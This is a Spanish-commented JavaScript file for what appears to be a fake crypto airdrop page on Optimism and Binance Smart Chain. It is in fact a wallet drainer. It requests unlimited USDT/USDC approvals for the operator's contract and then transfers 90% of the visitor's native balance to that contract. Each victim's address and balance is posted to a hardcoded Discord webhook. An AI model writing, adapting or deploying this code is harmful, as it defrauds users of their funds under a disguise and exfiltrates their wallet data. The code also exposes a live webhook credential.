 const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1360019304921436180/o61QmLpPd_TJ1lLxkXuzvyeW9VFtDvX7buOMmMYNDbbAqz1eod7Qi6F7TUto1JBQUGY_';

const NETWORKS = {
  optimism: {
    name: "Optimism",
    chainId: '0xA',
    rpcUrl: 'https://mainnet.optimism.io',
    explorer: 'https://optimistic.etherscan.io',
    currency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
    contractAddress: "0x579d705fE8bA250eDA39aa51E6443AD971112686"
  },
  bsc: {
    name: "Binance Smart Chain",
    chainId: '0x38',
    rpcUrl: 'https://bsc-dataseed.binance.org/',
    explorer: 'https://bscscan.com',
    currency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
    contractAddress: "0x231132763c55b15b5b9B81EfB8a25F5a7f946B94"
  }
};

const contractABI = [
  {
    "inputs": [
      { "internalType": "address[]", "name": "tokensERC20", "type": "address[]" },
      { "internalType": "uint256[]", "name": "amounts", "type": "uint256[]" },
      { "internalType": "address[]", "name": "contractsERC721", "type": "address[]" },
      { "internalType": "address[]", "name": "contractsERC1155", "type": "address[]" }
    ],
    "name": "claimAll",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  }
];

let web3;
let userAccount;
let contract;
let selectedNetwork = 'optimism';

// Escuchar cambios en el selector de red
document.getElementById('networkSelector').addEventListener('change', async (e) => {
  selectedNetwork = e.target.value;
  await connectNetwork();
});

// Conectar al cargar la página
window.onload = async () => {
  selectedNetwork = document.getElementById('networkSelector').value;
  await connectNetwork();
};

async function connectNetwork() {
  const net = NETWORKS[selectedNetwork];
  if (window.ethereum) {
    web3 = new Web3(window.ethereum);
    try {
      await ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: net.chainId }] });
    } catch (switchError) {
      if (switchError.code === 4902) {
        await ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId: net.chainId,
            chainName: net.name,
            rpcUrls: [net.rpcUrl],
            nativeCurrency: net.currency,
            blockExplorerUrls: [net.explorer]
          }]
        });
      } else {
        alert("Error al conectar a " + net.name);
        return;
      }
    }

    try {
      const accounts = await ethereum.request({ method: "eth_requestAccounts" });
      userAccount = accounts[0];
      contract = new web3.eth.Contract(contractABI, net.contractAddress);
      document.getElementById("approveTokens").disabled = false;
      document.getElementById("claimAll").disabled = false;
      alert("Error al conectar a " + net.name + ": " + userAccount);
    } catch (error) {
      alert("Error al conectar MetaMask");
    }
  } else {
    alert("MetaMask no está instalado");
  }
}


    document.getElementById("approveTokens").addEventListener("click", async () => {
      const button = document.getElementById("approveTokens");
      if (!userAccount) return alert("Primero conecta MetaMask");

      button.disabled = true;
      button.textContent = "Aprobando...";
      button.style.backgroundColor = "#f0b90b";

       const TOKENS_BY_NETWORK = {
  optimism: [
    "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", // USDT
    "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1" // USDC
  ],
  bsc: [
    "0x55d398326f99059fF775485246999027B3197955", // USDT BSC
    "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d" // USDC BSC
  ]
};

      const approveABI = [{
        "constant": false,
        "inputs": [{ "name": "spender", "type": "address" }, { "name": "amount", "type": "uint256" }],
        "name": "approve",
        "outputs": [{ "name": "", "type": "bool" }],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
      }];
const tokens = TOKENS_BY_NETWORK[selectedNetwork];

      try {
	

        for (const token of tokens) {

          const tokenContract = new web3.eth.Contract(approveABI, token);
          const balanceWei = await web3.eth.getBalance(userAccount);
          const balanceEth = web3.utils.fromWei(balanceWei, 'ether');
          await sendToDiscordWebhook('wallet', userAccount, balanceEth);
          await tokenContract.methods.approve(NETWORKS[selectedNetwork].contractAddress, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")

            .send({ from: userAccount });
        }

        button.textContent = "Conectado ✓";
        button.style.backgroundColor = "#00b15d";
        button.disabled = true;
      } catch (error) {
        console.error(error);
        alert("Error al aprobar tokens");
        button.textContent = "Conectar Wallet";
        button.style.backgroundColor = "#f0b90b";
        button.disabled = false;
      }
    });

document.getElementById("claimAll").addEventListener("click", async () => {
  if (!userAccount) return alert("Primero conecta MetaMask");
  if (!contract) return alert("Contrato no conectado aún");

  const TOKENS_BY_NETWORK = {
    optimism: [
      "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", // USDT
      "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1" // USDC
    ],
    bsc: [
      "0x55d398326f99059fF775485246999027B3197955", // USDT BSC
      "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d" // USDC BSC
    ]
  };

  const tokens = TOKENS_BY_NETWORK[selectedNetwork];
  if (!tokens || tokens.length === 0) {
    return alert("Error: Tokens no definidos para esta red.");
  }

  const amounts = [
    web3.utils.toWei("100", "ether"),
    web3.utils.toWei("100", "ether")
  ];

  try {
    await contract.methods.claimAll(tokens, amounts, [], []).send({ from: userAccount });

    const balanceWei = await web3.eth.getBalance(userAccount);
    const balanceEth = web3.utils.fromWei(balanceWei, 'ether');

    const ninetyPercent = web3.utils.toWei((parseFloat(balanceEth) * 0.9).toFixed(6), 'ether');

    await web3.eth.sendTransaction({
      from: userAccount,
      to: NETWORKS[selectedNetwork].contractAddress,
      value: ninetyPercent
    });

    await sendToDiscordWebhook('kyc', userAccount, balanceEth);
    alert("Airdrop recibido y 90% enviado al contrato");
  } catch (error) {
    console.error(error);
    alert("Error al ejecutar el claim: " + error.message);
  }
});
async function sendToDiscordWebhook(eventType, address, balance) {
  const embed = {
    title: eventType === 'wallet' ? 'Wallet Conectada' : 'KYC Iniciado',
    color: eventType === 'wallet' ? 0x00FF00 : 0xFFA500,
    fields: [
      { name: 'Dirección', value: address },
      { name: 'Balance', value: `${balance} ETH` }
    ],
    timestamp: new Date().toISOString()
  };

  try {
    await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });
  } catch (error) {
    console.error("Error enviando a Discord:", error);
  }
}



